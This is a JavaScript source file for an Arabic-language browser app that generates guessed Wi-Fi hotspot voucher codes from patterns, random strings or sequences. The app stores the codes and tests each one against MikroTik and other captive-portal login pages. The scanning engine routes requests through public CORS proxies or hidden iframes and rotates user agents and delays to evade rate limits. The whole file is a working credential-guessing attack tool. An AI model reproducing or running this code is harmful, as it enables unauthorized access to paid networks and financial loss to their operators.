// ==================== CONFIG ====================
const CONFIG = {
  proxies: {
    'corsproxy.io': 'https://corsproxy.io/?',
    'cors.sh': 'https://proxy.cors.sh/',
    'allorigins': 'https://api.allorigins.win/raw?url='
  },
  userAgents: [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  ]
};

// ==================== STATE ====================
const AppState = {
  generatedCards: [],
  isScanning: false,
  shouldStop: false,
  scanQueue: [],
  scanIndex: 0,
  scanResults: { success: 0, failed: 0 }
};

// ==================== INDEXEDDB ====================
class CardDatabase {
  constructor() {
    this.db = null;
    this.dbName = 'MikroTikScannerDB';
    this.version = 1;
  }

  async init() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.version);
      request.onerror = () => reject(request.error);
      request.onsuccess = () => { this.db = request.result; resolve(); };
      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains('cards')) {
          const store = db.createObjectStore('cards', { keyPath: 'id', autoIncrement: true });
          store.createIndex('card_number', 'card_number', { unique: true });
          store.createIndex('status', 'status', { unique: false });
          store.createIndex('created_at', 'created_at', { unique: false });
        }
        if (!db.objectStoreNames.contains('scan_logs')) {
          db.createObjectStore('scan_logs', { keyPath: 'id', autoIncrement: true });
        }
      };
    });
  }

  async addCards(cards) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cards', 'readwrite');
      const store = tx.objectStore('cards');
      let added = 0;
      cards.forEach(card => {
        const req = store.add({
          card_number: card,
          status: 'pending',
          created_at: new Date().toISOString(),
          last_tested: null,
          success_count: 0,
          fail_count: 0
        });
        req.onsuccess = () => added++;
        req.onerror = () => {};
      });
      tx.oncomplete = () => resolve(added);
      tx.onerror = () => reject(tx.error);
    });
  }

  async getCards(status = null) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cards', 'readonly');
      const store = tx.objectStore('cards');
      const request = status ? store.index('status').getAll(status) : store.getAll();
      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  async updateCard(cardNumber, updates) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cards', 'readwrite');
      const store = tx.objectStore('cards');
      const idx = store.index('card_number');
      const req = idx.get(cardNumber);
      req.onsuccess = () => {
        const card = req.result;
        if (card) {
          Object.assign(card, updates, { last_tested: new Date().toISOString() });
          store.put(card);
        }
        resolve();
      };
      req.onerror = () => reject(req.error);
    });
  }

  async deleteAllCards() {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cards', 'readwrite');
      const store = tx.objectStore('cards');
      const req = store.clear();
      req.onsuccess = () => resolve();
      req.onerror = () => reject(req.error);
    });
  }

  async deleteCard(id) {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cards', 'readwrite');
      const store = tx.objectStore('cards');
      const req = store.delete(id);
      req.onsuccess = () => resolve();
      req.onerror = () => reject(req.error);
    });
  }

  async getStats() {
    const cards = await this.getCards();
    return {
      total: cards.length,
      success: cards.filter(c => c.status === 'success').length,
      failed: cards.filter(c => c.status === 'failed').length,
      pending: cards.filter(c => c.status === 'pending').length
    };
  }
}

const db = new CardDatabase();

// ==================== UI UTILITIES ====================
function showToast(msg, type = 'info') {
  const container = document.getElementById('toastContainer');
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
  toast.innerHTML = `<span>${icons[type] || 'ℹ️'}</span><span>${msg}</span>`;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 3000);
}

function log(msg, type = 'info') {
  const consoleLog = document.getElementById('consoleLog');
  const timestamp = new Date().toLocaleTimeString('ar-SA');
  const icons = { info: 'ℹ️', success: '✅', error: '❌', warning: '⚠️' };
  consoleLog.textContent += `\n[${timestamp}] ${icons[type] || 'ℹ️'} ${msg}`;
  consoleLog.scrollTop = consoleLog.scrollHeight;
}

function updateStatus(active) {
  const dot = document.getElementById('statusDot');
  const text = document.getElementById('statusText');
  if (active) {
    dot.classList.remove('inactive');
    text.textContent = 'جاري...';
    text.style.color = 'var(--success)';
  } else {
    dot.classList.add('inactive');
    text.textContent = 'غير نشط';
    text.style.color = 'var(--text-muted)';
  }
}

function updateProgress(current, total) {
  const pct = Math.round((current / total) * 100);
  document.getElementById('progressBar').style.width = pct + '%';
  document.getElementById('progressPercent').textContent = pct + '%';
  document.getElementById('progressLabel').textContent = `${current} من ${total}`;
  document.getElementById('scanStats').textContent = `${AppState.scanResults.success}✓ ${AppState.scanResults.failed}✗`;
}

function switchTab(tabId, btn) {
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
  document.getElementById(tabId).classList.add('active');
  if (btn) btn.classList.add('active');
  if (tabId === 'tab-saved') renderSaved();
}

// ==================== GENERATION ====================
function toggleGenerationFields() {
  const mode = document.getElementById('genMode').value;
  document.getElementById('patternFields').classList.toggle('hide', mode !== 'pattern');
  document.getElementById('randomFields').classList.toggle('hide', mode !== 'random');
  document.getElementById('sequentialFields').classList.toggle('hide', mode !== 'sequential');
}

function detectPattern(cards) {
  const len = cards[0].length;
  let pattern = [];
  for (let i = 0; i < len; i++) {
    const chars = cards.map(c => c[i]).filter(Boolean);
    if (!chars.length) continue;
    const allSame = chars.every(c => c === chars[0]);
    if (allSame) pattern.push({ type: 'fixed', value: chars[0] });
    else {
      const isDigit = chars.every(c => /\d/.test(c));
      const isLower = chars.every(c => /[a-z]/.test(c));
      const isUpper = chars.every(c => /[A-Z]/.test(c));
      if (isDigit) pattern.push({ type: 'rand_digit' });
      else if (isLower) pattern.push({ type: 'rand_lower' });
      else if (isUpper) pattern.push({ type: 'rand_upper' });
      else pattern.push({ type: 'rand_mix' });
    }
  }
  return pattern;
}

function generateFromPattern(pattern) {
  return pattern.map(p => {
    if (p.type === 'fixed') return p.value;
    if (p.type === 'rand_digit') return Math.floor(Math.random() * 10);
    if (p.type === 'rand_lower') return String.fromCharCode(97 + Math.floor(Math.random() * 26));
    if (p.type === 'rand_upper') return String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return chars.charAt(Math.floor(Math.random() * chars.length));
  }).join('');
}

function executeGeneration() {
  const mode = document.getElementById('genMode').value;
  const amount = Math.min(parseInt(document.getElementById('genAmount').value) || 50, 1000);
  const cards = new Set();

  try {
    if (mode === 'pattern') {
      const samples = document.getElementById('patternSamples').value.trim().split('\n').map(s => s.trim()).filter(Boolean);
      if (samples.length < 2) { showToast('أدخل عينتين على الأقل', 'warning'); return; }
      const pattern = detectPattern(samples);
      while (cards.size < amount) cards.add(generateFromPattern(pattern));
    } else if (mode === 'random') {
      const prefix = document.getElementById('prefix').value.trim();
      const totalLen = Math.min(parseInt(document.getElementById('totalLength').value) || 8, 32);
      const needed = totalLen - prefix.length;
      if (needed <= 0) { showToast('البادئة طويلة', 'error'); return; }
      const sets = { numeric: '0123456789', alpha: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', alphanumeric: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' };
      const chars = sets[document.getElementById('charSet').value] || sets.numeric;
      while (cards.size < amount) {
        let part = '';
        for (let j = 0; j < needed; j++) part += chars.charAt(Math.floor(Math.random() * chars.length));
        cards.add(prefix + part);
      }
    } else if (mode === 'sequential') {
      const prefix = document.getElementById('seqPrefix').value.trim();
      const start = parseInt(document.getElementById('seqStart').value) || 1;
      for (let i = 0; i < amount; i++) cards.add(prefix + (start + i).toString().padStart(3, '0'));
    }

    AppState.generatedCards = Array.from(cards);
    renderGenerated();
    document.getElementById('statGenerated').textContent = AppState.generatedCards.length;
    showToast(`تم توليد ${cards.size} كرت`, 'success');
  } catch (e) { showToast('خطأ: ' + e.message, 'error'); }
}

function renderGenerated() {
  const list = document.getElementById('generatedList');
  const search = document.getElementById('searchResults').value.trim().toLowerCase();
  const filtered = search ? AppState.generatedCards.filter(c => c.toLowerCase().includes(search)) : AppState.generatedCards;

  if (!filtered.length) { list.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">لا توجد نتائج</div>'; return; }
  list.innerHTML = filtered.map(card => `
    <div class="result-item" onclick="navigator.clipboard.writeText('${card}').then(()=>showToast('تم النسخ','success'))">
      <span>${card}</span>
      <span style="font-size:11px;color:var(--text-muted);">${card.length} حرف</span>
    </div>
  `).join('');
}

function clearGeneration() {
  AppState.generatedCards = [];
  renderGenerated();
  showToast('تم المسح', 'info');
}

async function saveToDB() {
  if (!AppState.generatedCards.length) return showToast('لا يوجد شيء للحفظ', 'warning');
  try {
    const added = await db.addCards(AppState.generatedCards);
    showToast(`تم حفظ ${added} كرت`, 'success');
    updateStats();
  } catch (e) { showToast('خطأ في الحفظ', 'error'); }
}

// ==================== SCANNING ENGINE ====================
const TEMPLATES = {
  mikrotik: { url: 'http://10.0.0.1/login', method: 'get', usernameField: 'username', passwordField: 'password' },
  '1sh': { url: 'https://good.1sh.org/index.html', method: 'get', usernameField: 'username', passwordField: 'password' },
  anet: { url: 'http://a.net/login', method: 'post', usernameField: 'user', passwordField: 'pass' },
  custom: { url: '', method: 'get', usernameField: 'username', passwordField: 'password' }
};

function applyTemplate(name) {
  const t = TEMPLATES[name];
  if (!t) return;
  document.getElementById('loginURL').value = t.url;
  document.getElementById('httpMethod').value = t.method;
  document.querySelectorAll('.template-chip').forEach(b => b.classList.remove('active'));
  event.target.classList.add('active');
  showToast(`قالب ${name} محمل`, 'success');
}

function getProxyUrl() {
  const provider = document.getElementById('proxyProvider').value;
  return CONFIG.proxies[provider] || CONFIG.proxies['corsproxy.io'];
}

function getUserAgent() {
  const mode = document.getElementById('uaMode').value;
  if (mode === 'random') return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
  if (mode === 'desktop') return CONFIG.userAgents[2];
  return CONFIG.userAgents[0]; // mobile
}

function getRandomDelay() {
  const mode = document.getElementById('delayMode').value;
  if (mode === 'none') return 0;
  if (mode === 'light') return Math.floor(Math.random() * 2000) + 1000;
  return Math.floor(Math.random() * 4000) + 3000;
}

async function scanWithProxy(url, card, password, method) {
  const proxyUrl = getProxyUrl();
  const useProxy = document.getElementById('useProxy').checked;
  const fullUrl = useProxy ? proxyUrl + encodeURIComponent(url) : url;

  const data = { username: card };
  if (password) data.password = password;

  const options = {
    method: method.toUpperCase(),
    headers: {
      'User-Agent': getUserAgent(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'ar,en;q=0.9'
    }
  };

  if (method === 'post') {
    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    options.body = new URLSearchParams(data).toString();
  }

  try {
    const response = await fetch(fullUrl, options);
    const text = await response.text();
    const isSuccess = text.toLowerCase().includes('success') || 
                      text.toLowerCase().includes('connected') || 
                      text.toLowerCase().includes('welcome') ||
                      response.status === 302;
    const isFail = text.toLowerCase().includes('error') || 
                   text.toLowerCase().includes('invalid') || 
                   text.toLowerCase().includes('wrong');

    return {
      success: isSuccess && !isFail,
      status: response.status,
      preview: text.substring(0, 100)
    };
  } catch (e) {
    return { success: false, error: e.message, status: 0 };
  }
}

async function scanWithIframe(url, card, password) {
  // For GET requests, try iframe approach
  const params = new URLSearchParams({ username: card });
  if (password) params.append('password', password);
  const sep = url.includes('?') ? '&' : '?';
  const fullUrl = url + sep + params.toString();

  // Open in hidden iframe or new window
  return new Promise((resolve) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = fullUrl;
    document.body.appendChild(iframe);

    setTimeout(() => {
      try {
        // Try to detect redirect or success
        const iframeUrl = iframe.contentWindow?.location?.href || fullUrl;
        document.body.removeChild(iframe);
        resolve({ success: true, method: 'iframe', url: iframeUrl });
      } catch (e) {
        document.body.removeChild(iframe);
        resolve({ success: true, method: 'iframe', note: 'CORS blocked but request sent' });
      }
    }, 3000);
  });
}

async function startScan() {
  if (AppState.isScanning) return showToast('الفحص جاري', 'warning');

  const rawList = document.getElementById('testList').value.trim();
  const url = document.getElementById('loginURL').value.trim();
  const method = document.getElementById('httpMethod').value;
  const authType = document.getElementById('authType').value;
  const timeout = parseInt(document.getElementById('loginTimeOut').value) || 3000;

  if (!rawList || !url) return showToast('أدخل الكروت والرابط', 'warning');

  AppState.scanQueue = rawList.split('\n').map(c => c.trim()).filter(Boolean);
  AppState.scanIndex = 0;
  AppState.scanResults = { success: 0, failed: 0 };
  AppState.isScanning = true;
  AppState.shouldStop = false;

  document.getElementById('startBtn').disabled = true;
  document.getElementById('stopBtn').disabled = false;
  updateStatus(true);
  log(`🚀 بدء فحص ${AppState.scanQueue.length} كرت`, 'info');

  const resultsDiv = document.getElementById('scanResults');
  resultsDiv.innerHTML = '';

  for (let i = 0; i < AppState.scanQueue.length; i++) {
    if (AppState.shouldStop) break;

    const card = AppState.scanQueue[i];
    let password = null;
    if (authType === 'user_pass') password = card;

    // Delay
    const delay = getRandomDelay();
    if (delay > 0 && i > 0) await new Promise(r => setTimeout(r, delay));

    try {
      let result;
      if (method === 'get') {
        result = await scanWithIframe(url, card, password);
      } else {
        result = await scanWithProxy(url, card, password, method);
      }

      if (result.success) {
        AppState.scanResults.success++;
        await db.updateCard(card, { status: 'success' });
      } else {
        AppState.scanResults.failed++;
        await db.updateCard(card, { status: 'failed' });
      }

      // Add to results
      const item = document.createElement('div');
      item.className = `result-item ${result.success ? 'success' : 'failed'}`;
      item.innerHTML = `
        <span>${card}</span>
        <span class="result-badge ${result.success ? 'success' : 'failed'}">${result.success ? '✓' : '✗'}</span>
      `;
      resultsDiv.prepend(item);

      updateProgress(i + 1, AppState.scanQueue.length);
      log(`${result.success ? '✅' : '❌'} ${card}`, result.success ? 'success' : 'error');

    } catch (e) {
      AppState.scanResults.failed++;
      log(`❌ ${card} - خطأ: ${e.message}`, 'error');
    }
  }

  finishScan();
}

function stopScan() {
  AppState.shouldStop = true;
  showToast('إيقاف...', 'warning');
}

function finishScan() {
  AppState.isScanning = false;
  document.getElementById('startBtn').disabled = false;
  document.getElementById('stopBtn').disabled = true;
  updateStatus(false);
  log(`🏁 انتهى: ${AppState.scanResults.success} نجاح, ${AppState.scanResults.failed} فشل`, 'success');
  showToast(`اكتمل: ${AppState.scanResults.success} نجاح`, 'success');
  updateStats();
}

function clearScanLog() {
  document.getElementById('consoleLog').textContent = '🎯 جاهز...';
  document.getElementById('scanResults').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">ستظهر هنا...</div>';
  document.getElementById('progressBar').style.width = '0%';
  document.getElementById('progressPercent').textContent = '0%';
}

// ==================== SAVED CARDS ====================
async function renderSaved() {
  try {
    const cards = await db.getCards();
    const search = document.getElementById('searchSaved').value.trim().toLowerCase();
    const filtered = search ? cards.filter(c => c.card_number.toLowerCase().includes(search)) : cards;
    const list = document.getElementById('savedList');

    if (!filtered.length) { list.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">لا توجد كروت</div>'; return; }

    const statusColors = { pending: 'var(--text-muted)', success: 'var(--success)', failed: 'var(--danger)' };
    list.innerHTML = filtered.map(card => `
      <div class="result-item" style="border-right: 3px solid ${statusColors[card.status] || 'var(--text-muted)'};">
        <div>
          <div style="font-weight:600;">${card.card_number}</div>
          <div style="font-size:11px;color:var(--text-muted);">${card.status} • ${new Date(card.created_at).toLocaleDateString('ar-SA')}</div>
        </div>
        <button onclick="deleteSavedCard(${card.id})" style="background:none;border:none;color:var(--danger);font-size:18px;padding:4px;">🗑️</button>
      </div>
    `).join('');
  } catch (e) { console.error(e); }
}

async function deleteSavedCard(id) {
  await db.deleteCard(id);
  renderSaved();
  updateStats();
  showToast('تم الحذف', 'success');
}

async function loadSavedToScan() {
  const cards = await db.getCards();
  if (!cards.length) return showToast('لا توجد كروت', 'warning');
  document.getElementById('testList').value = cards.map(c => c.card_number).join('\n');
  switchTab('tab-test', document.querySelectorAll('.nav-item')[1]);
  showToast('تم التحميل', 'success');
}

async function clearAllSaved() {
  if (!confirm('حذف الكل؟')) return;
  await db.deleteAllCards();
  renderSaved();
  updateStats();
  showToast('تم الحذف', 'success');
}

// ==================== SETTINGS ====================
async function clearAllData() {
  if (!confirm('مسح جميع البيانات؟')) return;
  await db.deleteAllCards();
  updateStats();
  showToast('تم المسح', 'success');
}

async function updateStats() {
  try {
    const stats = await db.getStats();
    document.getElementById('statSaved').textContent = stats.total;
  } catch (e) {}
}

// ==================== INIT ====================
document.addEventListener('DOMContentLoaded', async () => {
  await db.init();
  toggleGenerationFields();
  updateStats();
  renderSaved();

  // Register Service Worker for PWA
  if ('serviceWorker' in navigator) {
    try {
      const reg = await navigator.serviceWorker.register('sw.js');
      console.log('SW registered:', reg);
    } catch (e) { console.log('SW failed:', e); }
  }

  // Pull to refresh
  let touchStartY = 0;
  document.addEventListener('touchstart', e => { touchStartY = e.touches[0].clientY; });
  document.addEventListener('touchend', async e => {
    const touchEndY = e.changedTouches[0].clientY;
    if (touchEndY - touchStartY > 150 && window.scrollY < 50) {
      showToast('جاري التحديث...', 'info');
      await updateStats();
      if (document.querySelector('.tab-content.active').id === 'tab-saved') renderSaved();
    }
  });
});
